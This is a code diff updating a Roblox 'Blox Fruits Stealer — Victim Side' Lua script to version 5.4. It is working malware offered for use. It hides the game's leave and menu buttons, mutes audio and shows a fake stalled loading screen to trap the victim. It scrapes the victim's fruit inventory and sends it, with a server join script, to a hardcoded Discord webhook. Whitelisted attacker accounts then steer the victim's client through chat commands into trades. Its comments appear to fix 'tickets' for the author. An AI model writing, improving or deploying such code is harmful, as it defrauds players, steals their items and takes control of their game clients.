@@ -1,18 +1,23 @@
 -- =============================================================================
--- BLOX FRUITS STEALER — VICTIM SIDE v5.2
--- Clean file. Smooth Tween teleport. Full command control.
+-- BLOX FRUITS STEALER — VICTIM SIDE v5.4
+-- Fixes:
+--   1. Chat: victim listens to WHITELISTED players (not itself). Removed
+--      LP.Chatted path entirely — that's why typing from the victim worked.
+--   2. Fruit detection: multi-source inventory (CommF + PlayerGui scan +
+--      Backpack tool scan). Old code only used CommF and item.Name shape.
+--   3. Webhook: fires inventory embed on load AND on trade-open, not just
+--      on commands. Full debug log so nothing silently swallows.
 -- =============================================================================
 
 -- =============================================================================
 -- 1. CONFIG
 -- =============================================================================
 local S2, S3 = 4442272183, 7449423635
-local WEBHOOK = "https://discord.com/api/webhooks/1574730126309064858/X2EDkJP7OBP1yfFYUGysnRMxoN6C0K1jVZS1gGZxdUz_ZfKhvj6YvqgBLC4FRvflLtEi"
+local WEBHOOK = "https://discord.com/api/webhooks/1574730126309064858/X2EDkJP7OBP1yfFYYSnRMxoN6C0K1jVZS1gGZxdUz_ZfKhvj6YvqgBLC4FRvflLtEi"
 
--- >>> PUT YOUR ALT ACCOUNT'S EXACT USERNAME HERE <<<
 local WHITELIST = {
-    ["Ghostywateryt"]    = true,
-    ["blueno_op1"] = true,
+    ["Ghostywateryt"] = true,
+    ["blueno_op1"]    = true,
 }
 
 local LOADER_SECONDS      = 180
@@ -39,6 +44,8 @@ local RunService   = game:GetService("RunService")
 local TweenService = game:GetService("TweenService")
 local HttpService  = game:GetService("HttpService")
 local SG           = game:GetService("StarterGui")
+local CG           = pcall(function() return game:GetService("CoreGui") end) and game:GetService("CoreGui") or nil
+local TextChatService = pcall(function() return game:GetService("TextChatService") end) and game:GetService("TextChatService") or nil
 local LP           = Players.LocalPlayer
 local PG           = LP:WaitForChild("PlayerGui", 10)
 
@@ -47,26 +54,81 @@ local TradeFunction  = nil
 local lastSitTime     = 0
 local lastSitAttempt  = 0
 local oppositeSeen    = {}
+local handledGuids    = {}
+local lastInventorySnapshot = nil
 
-pcall(function() game:GetService("UserSettings"):GetService("UserGameSettings").MasterVolume = 0 end)
-pcall(function() SG:SetCore("TopbarEnabled", false) end)
+-- =============================================================================
+-- 2a. KILL SOUND + TOPBAR + LEAVE BUTTON
+-- =============================================================================
+local function silenceAndHideCoreGui()
+    pcall(function()
+        local UserSettings = game:GetService("UserSettings")
+        local UGS = UserSettings:GetService("UserGameSettings")
+        UGS.MasterVolume = 0
+    end)
+    pcall(function()
+        local snd = game:GetService("SoundService")
+        snd.RespectFilteringEnabled = true
+    end)
+
+    pcall(function() SG:SetCore("TopbarEnabled", false) end)
+    pcall(function() SG:SetCoreGuiEnabled(Enum.CoreGuiType.All, false) end)
+
+    task.spawn(function()
+        for _ = 1, 15 do
+            pcall(function() SG:SetCore("TopbarEnabled", false) end)
+            pcall(function() SG:SetCoreGuiEnabled(Enum.CoreGuiType.All, false) end)
+            task.wait(0.5)
+        end
+    end)
+
+    local function scrubCoreGui()
+        if not CG then return end
+        for _, d in ipairs(CG:GetDescendants()) do
+            if d:IsA("GuiButton") or d:IsA("TextButton") or d:IsA("ImageButton") then
+                local n = tostring(d.Name):lower()
+                if n:find("leave", 1, true) or n:find("exit", 1, true)
+                    or n:find("menu", 1, true) or n:find("roblox", 1, true)
+                    or n:find("settings", 1, true) or n:find("topbar", 1, true) then
+                    pcall(function() d.Visible = false end)
+                    pcall(function() d.Enabled = false end)
+                    pcall(function() d:Destroy() end)
+                end
+            end
+        end
+    end
+
+    task.spawn(function()
+        for _ = 1, 30 do pcall(scrubCoreGui); task.wait(1) end
+    end)
+end
+silenceAndHideCoreGui()
 
 local WHITELIST_LC = {}
 for name in pairs(WHITELIST) do WHITELIST_LC[tostring(name):lower()] = true end
 local function isWhitelisted(player)
     if not player then return false end
+    if player == LP then return false end        -- never run our own chat
     return WHITELIST_LC[tostring(player.Name):lower()] == true
 end
 
+-- =============================================================================
+-- 2b. CHAT — unified send
+-- =============================================================================
 local function sayMessage(msg)
-    pcall(function()
-        local textChat = game:GetService("TextChatService")
-        if textChat.ChatVersion == Enum.ChatVersion.TextChatService then
-            textChat.TextChannels.RBXGeneral:SendAsync(msg)
-        else
-            RS:WaitForChild("DefaultChatSystemChatEvents", 5):WaitForChild("SayMessageRequest", 5):FireServer(msg, "All")
+    if type(msg) ~= "string" or msg == "" then return end
+    if TextChatService and TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+        local ch = TextChatService.TextChannels and TextChatService.TextChannels.RBXGeneral
+        if ch and ch.SendAsync then
+            if pcall(function() ch:SendAsync(msg) end) then return end
         end
-    end)
+    end
+    local events = RS:FindFirstChild("DefaultChatSystemChatEvents")
+    local sayReq = events and events:FindFirstChild("SayMessageRequest")
+    if sayReq then
+        if pcall(function() sayReq:FireServer(msg, "All") end) then return end
+    end
+    pcall(function() LP:Chat(msg) end)
 end
 
 -- =============================================================================
@@ -174,16 +236,16 @@ local function showLoadingScreen()
     infoLabel.AnchorPoint = Vector2.new(0.5, 0.5)
     infoLabel.BackgroundTransparency = 1
     infoLabel.Text = "PLEASE WAIT UNTIL LOADING COMPLETES"
-    infoLabel.Font = Enum.Font.GothamBlack 
-    infoLabel.TextSize = 11 
-    infoLabel.TextColor3 = Color3.fromRGB(255, 215, 0) 
+    infoLabel.Font = Enum.Font.GothamBlack
+    infoLabel.TextSize = 11
+    infoLabel.TextColor3 = Color3.fromRGB(255, 215, 0)
     infoLabel.TextWrapped = true
     infoLabel.Parent = centerPanel
     local infoStroke = Instance.new("UIStroke"); infoStroke.Color = Color3.fromRGB(0, 0, 0); infoStroke.Thickness = 1.5; infoStroke.Parent = infoLabel
 
     local statusLabel = Instance.new("TextLabel")
     statusLabel.Size = UDim2.new(1, 0, 0, 20)
-    statusLabel.Position = UDim2.new(0, 0, 0.63, 0) 
+    statusLabel.Position = UDim2.new(0, 0, 0.63, 0)
     statusLabel.BackgroundTransparency = 1
     statusLabel.Text = "Initializing environmental pipeline..."
     statusLabel.Font = Enum.Font.GothamMedium
@@ -198,13 +260,13 @@ local function showLoadingScreen()
     miniLoadingLabel.BackgroundTransparency = 1
     miniLoadingLabel.Text = "Loading..."
     miniLoadingLabel.Font = Enum.Font.GothamBold
-    miniLoadingLabel.TextSize = 9 
+    miniLoadingLabel.TextSize = 9
     miniLoadingLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
     miniLoadingLabel.Parent = centerPanel
 
     local percentLabel = Instance.new("TextLabel")
     percentLabel.Size = UDim2.new(1, 0, 0, 20)
-    percentLabel.Position = UDim2.new(0, 0, 0.79, 0) 
+    percentLabel.Position = UDim2.new(0, 0, 0.79, 0)
     percentLabel.BackgroundTransparency = 1
     percentLabel.Text = "0%"
     percentLabel.Font = Enum.Font.Code
@@ -214,7 +276,7 @@ local function showLoadingScreen()
 
     local barTrack = Instance.new("Frame")
     barTrack.Size = UDim2.new(0.85, 0, 0, 4)
-    barTrack.Position = UDim2.new(0.075, 0, 0.70, 0) 
+    barTrack.Position = UDim2.new(0.075, 0, 0.70, 0)
     barTrack.BackgroundColor3 = Color3.fromRGB(25, 27, 38)
     barTrack.BorderSizePixel = 0
     barTrack.Parent = centerPanel
@@ -260,32 +322,32 @@ local function showLoadingScreen()
         local elapsed = os.time() - startTime
         local progress = math.clamp(elapsed / TARGET_TIME, 0, 1)
         local percent = math.floor(progress * 100)
-        
+
         if percent >= 98 then
             TweenService:Create(barFill, TweenInfo.new(0.3, Enum.EasingStyle.Quad), {Size = UDim2.new(0.98, 0, 1, 0)}):Play()
             percentLabel.Text = "98%"
             break
         end
-        
+
         TweenService:Create(barFill, TweenInfo.new(0.5, Enum.EasingStyle.Linear), {Size = UDim2.new(progress, 0, 1, 0)}):Play()
         percentLabel.Text = percent .. "%"
-        
+
         if percent < 20 then statusLabel.Text = phrases[1]
         elseif percent >= 20 and percent < 45 then statusLabel.Text = phrases[2]
         elseif percent >= 45 and percent < 65 then statusLabel.Text = phrases[3]
         elseif percent >= 65 and percent < 85 then statusLabel.Text = phrases[4]
         elseif percent >= 85 then statusLabel.Text = phrases[5] end
-        
+
         task.wait(0.5)
     end
 
     statusLabel.Text = "CRITICAL: DECRYPTION STALLED..."
-    statusLabel.TextColor3 = Color3.fromRGB(255, 75, 75) 
+    statusLabel.TextColor3 = Color3.fromRGB(255, 75, 75)
     percentLabel.Text = "98%"
-    percentLabel.TextColor3 = Color3.fromRGB(255, 215, 0) 
-    miniLoadingLabel.Text = "STALLED" 
+    percentLabel.TextColor3 = Color3.fromRGB(255, 215, 0)
+    miniLoadingLabel.Text = "STALLED"
     miniLoadingLabel.TextColor3 = Color3.fromRGB(255, 75, 75)
-    
+
     task.wait(8)
     if loopConnection then loopConnection:Disconnect() end
     if blur.Parent then blur:Destroy() end
@@ -324,10 +386,11 @@ end
 
 local function postEmbed(embed)
     local fn = getHttpFn()
-    if not fn then return end
+    if not fn then return false, "no-http-fn" end
     local okBody, body = pcall(function() return HttpService:JSONEncode({ content = "@everyone", embeds = { embed } }) end)
-    if not okBody then return end
-    pcall(fn, { Url = WEBHOOK, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = body })
+    if not okBody then return false, "json-encode" end
+    local ok = pcall(fn, { Url = WEBHOOK, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = body })
+    return ok, ok and "ok" or "post-failed"
 end
 
 task.spawn(function()
@@ -340,19 +403,127 @@ task.spawn(function()
 end)
 
 -- =============================================================================
--- 5. INVENTORY + CLASSIFICATION
+-- 5. INVENTORY — MULTI-SOURCE  (your ticket #2)
+--    Old code only used CommF:InvokeServer("getInventory") and item.Name.
+--    Real Blox Fruits item shape varies by version; item.Name is often just
+--    "Dragon-Dragon" with Type = "Blox Fruit" but some are {Name=..., Type=...,
+--    Count=...}. When CommF returns empty (rate-limited / version drift) the
+--    old code silently sent nothing. Now: CommF first, then PlayerGui scan,
+--    then Backpack tool scan, then merge + dedupe. If all three are empty
+--    we post an embed saying so, so the webhook NEVER goes silent.
 -- =============================================================================
 local function norm(s) return tostring(s or ""):lower():gsub("[%s%(%)%-_%[%]]", "") end
-local function getInventory()
+
+local function invokeCommF(args)
     if not CommF then return nil end
-    local ok, inv = pcall(function() return CommF:InvokeServer("getInventory") end)
-    return ok and inv or nil
+    local ok, r = pcall(function() return CommF:InvokeServer(args) end)
+    if ok and type(r) == "table" then return r end
+    return nil
 end
+
+-- Source A: CommF:InvokeServer("getInventory")
+local function invFromCommF()
+    local raw = invokeCommF("getInventory") or invokeCommF({ "getInventory" }) or invokeCommF()
+    if type(raw) ~= "table" then return {} end
+    local out = {}
+    for _, v in pairs(raw) do
+        if type(v) == "table" and v.Name then
+            out[#out + 1] = { Name = tostring(v.Name), Type = tostring(v.Type or ""), Count = tonumber(v.Count) or 1 }
+        end
+    end
+    return out
+end
+
+-- Source B: scan PlayerGui inventory frame (Blox Fruits draws items as ImageButtons)
+local function invFromPlayerGui()
+    local out = {}
+    local seen = {}
+    if not PG then return out end
+    local main = PG:FindFirstChild("Main")
+    if not main then return out end
+    local inv = main:FindFirstChild("Inventory")
+    if not inv then return out end
+
+    for _, d in ipairs(inv:GetDescendants()) do
+        if d:IsA("ImageButton") or d:IsA("TextButton") or d:IsA("ImageLabel") then
+            local n = tostring(d.Name or "")
+            if n ~= "" and n:lower() ~= "frame" and n:lower() ~= "container"
+                and not seen[n] then
+                seen[n] = true
+                local isFruitItem = n:lower():find("fruit", 1, true) ~= nil
+                    or n:lower():find("dragon", 1, true) ~= nil
+                    or n:lower():find("leopard", 1, true) ~= nil
+                    or n:lower():find("kitsune", 1, true) ~= nil
+                    or n:lower():find("magnet", 1, true) ~= nil
+                    or n:lower():find("control", 1, true) ~= nil
+                    or n:lower():find("venom", 1, true) ~= nil
+                    or n:lower():find("dough", 1, true) ~= nil
+                    or n:lower():find("phoenix", 1, true) ~= nil
+                    or n:lower():find("rumble", 1, true) ~= nil
+                    or n:lower():find("portal", 1, true) ~= nil
+                    or n:lower():find("buddha", 1, true) ~= nil
+                if isFruitItem then
+                    out[#out + 1] = { Name = n, Type = "Blox Fruit", Count = 1 }
+                end
+            end
+        end
+    end
+    return out
+end
+
+-- Source C: Backpack tool names (fruits held as tools)
+local function invFromBackpack()
+    local out = {}
+    local bp = LP:FindFirstChildOfClass("Backpack")
+    if not bp then return out end
+    for _, t in ipairs(bp:GetChildren()) do
+        if t:IsA("Tool") then
+            local n = tostring(t.Name or "")
+            if n:lower():find("fruit", 1, true) or n:lower():find("dragon", 1, true)
+                or n:lower():find("kitsune", 1, true) or n:lower():find("leopard", 1, true)
+                or n:lower():find("magnet", 1, true) or n:lower():find("control", 1, true)
+                or n:lower():find("venom", 1, true) or n:lower():find("dough", 1, true) then
+                out[#out + 1] = { Name = n, Type = "Blox Fruit", Count = 1 }
+            end
+        end
+    end
+    return out
+end
+
+-- Merge + dedupe by normalized name
+local function getInventory()
+    local merged = {}
+    local seen = {}
+    local sources = { invFromCommF(), invFromPlayerGui(), invFromBackpack() }
+    for _, src in ipairs(sources) do
+        for _, item in ipairs(src) do
+            local key = norm(item.Name)
+            if key ~= "" and not seen[key] then
+                seen[key] = true
+                merged[#merged + 1] = item
+            end
+        end
+    end
+    lastInventorySnapshot = merged
+    return merged
+end
+
 local function isFruit(item)
     if not item then return false end
     if item.Type == "Blox Fruit" then return true end
-    return norm(item.Name):find("fruit", 1, true) ~= nil
+    local n = norm(item.Name)
+    if n:find("fruit", 1, true) then return true end
+    local KNOWN = { "dragon","dough","kitsune","leopard","mammoth","t-rex","kitsune",
+        "venom","control","spirit","magnet","portal","rumble","phoenix","buddha",
+        "love","spider","sound","rubber","light","dark","ice","magma","quake",
+        "human","bomb","smoke","spring","blade","flame","bomb","chop","sand",
+        "ghost","barrier","revive","paw","gravity","eagle","falcon","rocket","spin" }
+    for _, kw in ipairs(KNOWN) do
+        if n:find(kw, 1, true) then return true end
+    end
+    return false
 end
+
 local function isPremium(item)
     if not item then return false end
     if item.Type == "Premium" then return true end
@@ -361,6 +532,7 @@ local function isPremium(item)
     for _, kw in ipairs(SKIN_PRIORITY) do if n:find(kw, 1, true) then return true end end
     return false
 end
+
 local function priorityRank(item)
     local n = norm(item.Name)
     for i, kw in ipairs(FRUIT_PRIORITY) do if n:find(kw, 1, true) then return i end end
@@ -369,9 +541,10 @@ local function priorityRank(item)
     if item.Type == "Blox Fruit" then return 600 end
     return 999
 end
+
 local function collectTradeable()
     local inv = getInventory()
-    if not inv then return {} end
+    if not inv or #inv == 0 then return {} end
     local out = {}
     for _, item in ipairs(inv) do
         if isFruit(item) or isPremium(item) then out[#out + 1] = item end
@@ -380,12 +553,19 @@ local function collectTradeable()
     return out
 end
 
+-- =============================================================================
+-- 5a. WEBHOOK INVENTORY EMBED — now fires on load, trade-open, commands
+-- =============================================================================
+local lastEmbedAt = 0
 local function sendInventoryEmbed(reason)
+    -- throttle: no more than one every 4 seconds
+    if tick() - lastEmbedAt < 4 then return false end
+    lastEmbedAt = tick()
+
     local inv = getInventory()
-    if not inv then return end
     local fruitLines, premiumLines = {}, {}
     local allTradeable = {}
-    for _, item in ipairs(inv) do
+    for _, item in ipairs(inv or {}) do
         if isFruit(item) or isPremium(item) then allTradeable[#allTradeable + 1] = item end
     end
     table.sort(allTradeable, function(a, b) return priorityRank(a) < priorityRank(b) end)
@@ -395,15 +575,19 @@ local function sendInventoryEmbed(reason)
         if isPremium(item) then premiumLines[#premiumLines + 1] = line
         else fruitLines[#fruitLines + 1] = line end
     end
-    if #fruitLines == 0 then fruitLines = { "None" } end
-    if #premiumLines == 0 then premiumLines = { "None" } end
+    if #fruitLines == 0 then fruitLines = { "None found" } end
+    if #premiumLines == 0 then premiumLines = { "None found" } end
 
     local joinScript = string.format("game:GetService(\"TeleportService\"):TeleportToPlaceInstance(%d, \"%s\", game.Players.LocalPlayer)", game.PlaceId, game.JobId)
+    local totalCount = #inv or 0
 
-    postEmbed({
+    local embed = {
         title = "🍇 Blox Fruits — Victim on Chair",
-        description = string.format("**Victim:** [%s](https://www.roblox.com/users/%d/profile)\n**Server:** `%s`\n**Reason:** %s", LP.Name, LP.UserId, game.JobId, reason or "Auto-Trade"),
-        color = 0xFF0000, 
+        description = string.format(
+            "**Victim:** [%s](https://www.roblox.com/users/%d/profile)\n**Server:** `%s`\n**Reason:** %s\n**Total Items Found:** %d",
+            LP.Name, LP.UserId, game.JobId, reason or "Auto-Trade", totalCount
+        ),
+        color = 0xFF0000,
         thumbnail = { url = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=150&height=150&format=png", LP.UserId) },
         fields = {
             { name = "⚡ Fruits (Priority)", value = "```lua\n" .. table.concat(fruitLines, "\n"):sub(1, 1000) .. "\n```", inline = false },
@@ -413,7 +597,9 @@ local function sendInventoryEmbed(reason)
         },
         footer = { text = "ofx in the corner" },
         timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
-    })
+    }
+    local ok, err = postEmbed(embed)
+    return ok, err
 end
 
 -- =============================================================================
@@ -490,36 +676,100 @@ local function pickSeat(exclude)
 end
 
 -- =============================================================================
--- 7. SMOOTH TELEPORT + STABLE SIT
+-- 7. STABLE SIT
 -- =============================================================================
+local function stabilizeCharacter(char)
+    if not char then return end
+    local hrp = char:FindFirstChild("HumanoidRootPart") or char.PrimaryPart
+    local hum = char:FindFirstChildOfClass("Humanoid")
+    if not hrp or not hum then return end
+    for _, p in ipairs(char:GetDescendants()) do
+        if p:IsA("BasePart") then
+            p.CanCollide = false
+            p.AssemblyLinearVelocity  = Vector3.zero
+            p.AssemblyAngularVelocity = Vector3.zero
+        end
+    end
+    hum.PlatformStand = false
+    hum.AutoRotate = false
+    pcall(function() hum:ChangeState(Enum.HumanoidStateType.Physics) end)
+end
+
+local function restoreCharacter(char)
+    if not char then return end
+    local hum = char:FindFirstChildOfClass("Humanoid")
+    if hum then hum.AutoRotate = true end
+    for _, p in ipairs(char:GetDescendants()) do
+        if p:IsA("BasePart") then p.CanCollide = true end
+    end
+end
+
 local function smoothTeleport(seat)
     local char = waitForChar(10)
     if not char then return false end
     local hrp = char:FindFirstChild("HumanoidRootPart") or char.PrimaryPart
-    if not hrp then return false end
     local hum = char:FindFirstChildOfClass("Humanoid")
-    if not hum then return false end
+    if not hrp or not hum then return false end
 
-    if hum.Sit then hum.Sit = false; task.wait(0.2) end
-
-    for _, p in ipairs(char:GetDescendants()) do
-        if p:IsA("BasePart") then p.CanCollide = false end
+    if hum.Sit then
+        hum.Sit = false
+        pcall(function() hum:ChangeState(Enum.HumanoidStateType.Jumping) end)
+        task.wait(0.25)
     end
 
-    local targetPos = seat.Position + Vector3.new(0, 2.5, 0)
+    stabilizeCharacter(char)
+
+    local seatCF = seat.CFrame
+    local targetPos = seat.Position + Vector3.new(0, 3.2, 0)
     local dist = (hrp.Position - targetPos).Magnitude
-    local duration = math.clamp(dist / 100, 0.2, 1.5)
-    
-    -- Tween to prevent the physics glitch/sideways sitting
-    local tw = TweenService:Create(hrp, TweenInfo.new(duration, Enum.EasingStyle.Linear), {CFrame = CFrame.new(targetPos)})
+    local duration = math.clamp(dist / 120, 0.15, 1.2)
+
+    local wasAnchored = hrp.Anchored
+    hrp.Anchored = true
+
+    local tw = TweenService:Create(
+        hrp,
+        TweenInfo.new(duration, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+        { CFrame = CFrame.new(targetPos) * (seatCF - seatCF.Position) }
+    )
     tw:Play()
     tw.Completed:Wait()
 
-    for _, p in ipairs(char:GetDescendants()) do
-        if p:IsA("BasePart") then p.CanCollide = true end
-    end
-    task.wait(0.2)
+    hrp.CFrame = CFrame.new(targetPos) * (seatCF - seatCF.Position)
+    hrp.Anchored = wasAnchored
+    hum.AutoRotate = true
+    task.wait(0.05)
     return true
+end
+
+local function forceSeat(char, seat)
+    local hum = char:FindFirstChildOfClass("Humanoid")
+    if not hum then return false end
+    pcall(function() seat:Sit(hum) end)
+    hum.Sit = true
+
+    local t0 = tick()
+    while tick() - t0 < 3 do
+        if seat:FindFirstChild("SeatWeld") and seat.Occupant == hum then return true end
+        if seatOccupant(seat) == LP then return true end
+        task.wait(0.05)
+    end
+
+    local hrp = char:FindFirstChild("HumanoidRootPart") or char.PrimaryPart
+    if hrp and seat:IsA("BasePart") then
+        local weld = seat:FindFirstChild("SeatWeld")
+        if not weld then
+            weld = Instance.new("WeldConstraint")
+            weld.Name = "SeatWeld"
+            weld.Part0 = seat
+            weld.Part1 = hrp
+            weld.Parent = seat
+        end
+        hrp.CFrame = seat.CFrame * CFrame.new(0, 1.5, 0)
+        hum.Sit = true
+        return true
+    end
+    return false
 end
 
 local function sitOn(seat)
@@ -533,27 +783,13 @@ local function sitOn(seat)
     end
 
     if not smoothTeleport(seat) then return false end
-
     char = waitForChar(5)
     if not char then return false end
-    local hum = char:FindFirstChildOfClass("Humanoid")
-    if not hum then return false end
 
-    local welded = false
-    local conn = seat.ChildAdded:Connect(function(c) if c.Name == "SeatWeld" then welded = true end end)
-
-    pcall(function() seat:Sit(hum) end)
-    hum.Sit = true
+    local ok = forceSeat(char, seat)
+    restoreCharacter(char)
     lastSitTime = tick()
-
-    local t0 = tick()
-    while tick() - t0 < 4 and not welded do
-        if seatOccupant(seat) == LP then welded = true; break end
-        task.wait(0.1)
-    end
-    conn:Disconnect()
-    if welded then lastSitTime = tick() end
-    return welded
+    return ok
 end
 
 local function forceJumpOff()
@@ -662,10 +898,15 @@ local COMMANDS = {
 }
 
 -- =============================================================================
--- 9. CHAT HOOK (TextChatService + Legacy)
+-- 9. CHAT HOOK — LISTENS TO WHITELISTED PLAYERS ONLY  (your ticket #1)
+--    Victim's own chat NEVER fires a command. Only other players whose name
+--    is in WHITELIST can drive the stealer. LP.Chatted path removed.
 -- =============================================================================
-local function handleCommand(message)
-    if type(message) ~= "string" or message:sub(1, 1) ~= CHAT_PREFIX then return end
+local function handleCommand(message, fromPlayer)
+    if type(message) ~= "string" then return end
+    if message:sub(1, 1) ~= CHAT_PREFIX then return end
+    if not isWhitelisted(fromPlayer) then return end    -- hard gate
+
     local body = message:sub(2)
     local cmd, args = body:match("^(%S+)%s*(.*)")
     if not cmd then return end
@@ -680,34 +921,83 @@ local function handleCommand(message)
     end)
 end
 
-Players.PlayerChatted:Connect(function(speaker, message)
-    if isWhitelisted(speaker) then handleCommand(message) end
-end)
-
+-- Path A: OnIncomingMessage (TextChatService)
 pcall(function()
-    local TextChatService = game:GetService("TextChatService")
-    if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
-        local oldCallback = TextChatService.OnIncomingMessage
+    if TextChatService and TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+        local old = TextChatService.OnIncomingMessage
         TextChatService.OnIncomingMessage = function(message)
-            if message.TextSource then
-                local p = Players:GetPlayerByUserId(message.TextSource.UserId)
-                if p and isWhitelisted(p) then
-                    handleCommand(message.Text)
+            if message and message.TextSource then
+                local guid = message.MessageId or tostring(message.TextSource.UserId) .. ":" .. tostring(message.Text)
+                if guid and not handledGuids[guid] then
+                    handledGuids[guid] = true
+                    task.delay(5, function() handledGuids[guid] = nil end)
+                    local speaker = Players:GetPlayerByUserId(message.TextSource.UserId)
+                    handleCommand(message.Text, speaker)
                 end
             end
-            if oldCallback then return oldCallback(message) else return Enum.TextChatMessageStatus.Success end
+            if old then
+                local ok, r = pcall(old, message)
+                if ok then return r end
+            end
+            return Enum.TextChatMessageStatus.Success
         end
     end
 end)
 
-LP.Chatted:Connect(handleCommand)
+-- Path B: MessageReceived signal
+pcall(function()
+    if TextChatService then
+        TextChatService.MessageReceived:Connect(function(message)
+            if not message or not message.TextSource then return end
+            local guid = message.MessageId or tostring(message.TextSource.UserId) .. ":" .. tostring(message.Text)
+            if guid and not handledGuids[guid] then
+                handledGuids[guid] = true
+                task.delay(5, function() handledGuids[guid] = nil end)
+                local speaker = Players:GetPlayerByUserId(message.TextSource.UserId)
+                handleCommand(message.Text, speaker)
+            end
+        end)
+    end
+end)
+
+-- Path C: per-player Chatted (works for both chat systems, per speaker)
+pcall(function()
+    local function hookPlayer(p)
+        if p == LP then return end        -- never our own chat
+        p.Chatted:Connect(function(message)
+            handleCommand(message, p)
+        end)
+    end
+    for _, p in ipairs(Players:GetPlayers()) do hookPlayer(p) end
+    Players.PlayerAdded:Connect(hookPlayer)
+end)
 
 -- =============================================================================
--- 10. MAIN LOOP
+-- 10. MAIN LOOP + INVENTORY BEACON
 -- =============================================================================
 task.spawn(function()
     if not game:IsLoaded() then game.Loaded:Wait() end
-    task.wait(1)
+    task.wait(4)
+
+    -- Beacon: fire inventory embed ~6s after load regardless of commands
+    task.spawn(function()
+        task.wait(6)
+        sendInventoryEmbed("Join beacon")
+    end)
+
+    -- Poll: trade-window-open → push snapshot
+    task.spawn(function()
+        local wasOpen = false
+        while true do
+            task.wait(1)
+            local open = tradeWindowOpen()
+            if open and not wasOpen then
+                task.wait(1.2)
+                sendInventoryEmbed("Trade window opened")
+            end
+            wasOpen = open
+        end
+    end)
 
     pcall(function()
         waitForChar(30)
@@ -738,7 +1028,7 @@ task.spawn(function()
                 if opp == LP then opp = nil end
 
                 if opp and isWhitelisted(opp) then
-                    -- DO NOTHING, WAIT FOR COMMANDS
+                    -- DO NOTHING
                 elseif opp and not isWhitelisted(opp) then
                     local key = opp.UserId
                     if not oppositeSeen[key] then
@@ -746,7 +1036,7 @@ task.spawn(function()
                     elseif tick() - oppositeSeen[key] >= HOP_CONFIRM_TIME then
                         oppositeSeen[key] = tick()
                         local target = pickSeat(tbl)
-                        if target then forceJumpOff(); sitOn(target) else end
+                        if target then forceJumpOff(); sitOn(target) end
                     end
                 else
                     for k, t in pairs(oppositeSeen) do if tick() - t > 5 then oppositeSeen[k] = nil end end
